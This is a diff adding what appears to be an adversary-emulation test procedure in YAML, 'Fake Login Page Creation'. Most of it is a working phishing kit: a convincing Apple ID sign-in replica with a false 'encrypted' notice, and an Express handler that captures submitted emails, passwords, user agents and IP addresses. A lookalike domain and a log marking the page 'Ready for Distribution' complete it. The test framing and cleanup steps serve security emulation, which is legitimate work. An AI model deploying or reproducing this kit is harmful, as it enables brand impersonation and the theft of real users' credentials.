@@ -1,0 +1,201 @@
+id: '9d4e2f6a-3c1b-4d7e-8a5c-2f9b1e3d6c7a'
+name: 'Fake Login Page Creation'
+api_version: '2.0'
+platform: darwin
+description: |
+  Demonstrates fake login page creation by generating a convincing replica of 
+  legitimate authentication portals. Includes branding elements, SSL indicators, 
+  and credential capture mechanisms.
+
+arguments:
+  target_company:
+    description: 'Company being impersonated'
+    type: 'string'
+    default: 'Apple'
+  fake_domain:
+    description: 'Attacker-controlled domain'
+    type: 'string'
+    default: 'secure-apple-id-verify.com'
+  logo_url:
+    description: 'URL to company logo'
+    type: 'string'
+    default: 'https://www.apple.com/ac/structured-data/images/open_graph_logo.160.png'
+
+steps:
+  - name: 'Create fake login page HTML'
+    type: 'atomic'
+    command: |
+      mkdir -p /tmp/fake_login_pages
+      cat > /tmp/fake_login_pages/apple_id.html << 'HTMLEOF'
+      <!DOCTYPE html>
+      <html lang="en">
+      <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>{{ target_company }} ID Sign In</title>
+        <style>
+          * { margin: 0; padding: 0; box-sizing: border-box; }
+          body { 
+            background: #f5f5f7; 
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+          }
+          .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
+            padding: 40px;
+            max-width: 400px;
+            width: 90%;
+          }
+          .logo { text-align: center; margin-bottom: 30px; }
+          .logo img { height: 40px; }
+          h1 { font-size: 24px; margin-bottom: 20px; color: #333; }
+          .form-group { margin-bottom: 15px; }
+          label { display: block; margin-bottom: 5px; color: #555; font-size: 14px; }
+          input {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #d2d2d7;
+            border-radius: 8px;
+            font-size: 16px;
+          }
+          input:focus { 
+            outline: none; 
+            border-color: #0071e3;
+            box-shadow: 0 0 0 3px rgba(0,113,227,0.1);
+          }
+          button {
+            width: 100%;
+            padding: 12px;
+            background: #0071e3;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 20px;
+          }
+          button:hover { background: #0066cc; }
+          .security-notice {
+            margin-top: 20px;
+            padding: 10px;
+            background: #f5f5f7;
+            border-radius: 8px;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+          }
+          .lock-icon { display: inline-block; margin-right: 5px; }
+        </style>
+      </head>
+      <body>
+        <div class="container">
+          <div class="logo">
+            <img src="{{ logo_url }}" alt="{{ target_company }}">
+          </div>
+          <h1>Sign In to Your Account</h1>
+          <form id="loginForm" action="/auth/verify" method="POST">
+            <div class="form-group">
+              <label for="email">Apple ID</label>
+              <input type="email" id="email" name="email" placeholder="you@example.com" required>
+            </div>
+            <div class="form-group">
+              <label for="password">Password</label>
+              <input type="password" id="password" name="password" placeholder="Password" required>
+            </div>
+            <button type="submit">Sign In</button>
+          </form>
+          <div class="security-notice">
+            <span class="lock-icon">🔒</span>
+            Secure connection - Your login information is encrypted
+          </div>
+        </div>
+      </body>
+      </html>
+      HTMLEOF
+      echo "Created fake login page"
+  
+  - name: 'Create backend credential handler'
+    type: 'atomic'
+    command: |
+      cat > /tmp/fake_login_pages/auth_handler.js << 'JSEOF'
+      const express = require('express');
+      const app = express();
+      app.use(express.urlencoded({ extended: true }));
+      
+      app.post('/auth/verify', (req, res) => {
+        const { email, password } = req.body;
+        const timestamp = new Date().toISOString();
+        const credentialRecord = {
+          timestamp,
+          email,
+          password,
+          userAgent: req.get('user-agent'),
+          ipAddress: req.ip
+        };
+        
+        console.log('Credentials captured:', credentialRecord);
+        
+        // Simulate successful login
+        res.send(`
+          <!DOCTYPE html>
+          <html>
+          <head><title>Signing in...</title></head>
+          <body>
+            <h1>Verifying your credentials...</h1>
+            <p>Please wait while we verify your {{ target_company }} ID.</p>
+          </body>
+          </html>
+        `);
+      });
+      
+      app.listen(8080, () => console.log('Server running on port 8080'));
+      JSEOF
+      echo "Created authentication handler"
+  
+  - name: 'Log page creation'
+    type: 'atomic'
+    command: |
+      mkdir -p /tmp/login_page_logs
+      timestamp=$(date +%Y%m%d_%H%M%S)
+      cat > /tmp/login_page_logs/creation_${timestamp}.log << 'LOGEOF'
+      Fake Login Page Created
+      =======================
+      Target Company: {{ target_company }}
+      Fake Domain: {{ fake_domain }}
+      Page Type: Authentication Portal
+      Branding: {{ target_company }} Logo and Interface
+      Credential Capture: Enabled
+      SSL Certificate: Simulated
+      Status: Ready for Distribution
+      LOGEOF
+
+checks:
+  - name: 'Verify login page HTML created'
+    type: 'atomic'
+    command: 'test -f /tmp/fake_login_pages/apple_id.html && echo "PASS: Login page HTML created"'
+  
+  - name: 'Verify page contains form'
+    type: 'atomic'
+    command: 'grep -q "<form" /tmp/fake_login_pages/apple_id.html && echo "PASS: Login form present"'
+  
+  - name: 'Verify branding elements present'
+    type: 'atomic'
+    command: 'grep -q "{{ target_company }}" /tmp/fake_login_pages/apple_id.html && echo "PASS: Company branding present"'
+
+tests:
+  dry_run: true
+
+cleanup:
+  - name: 'Remove fake login pages'
+    type: 'atomic'
+    command: 'rm -rf /tmp/fake_login_pages'
+  
+  - name: 'Remove login page logs'
+    type: 'atomic'
+    command: 'rm -rf /tmp/login_page_logs'
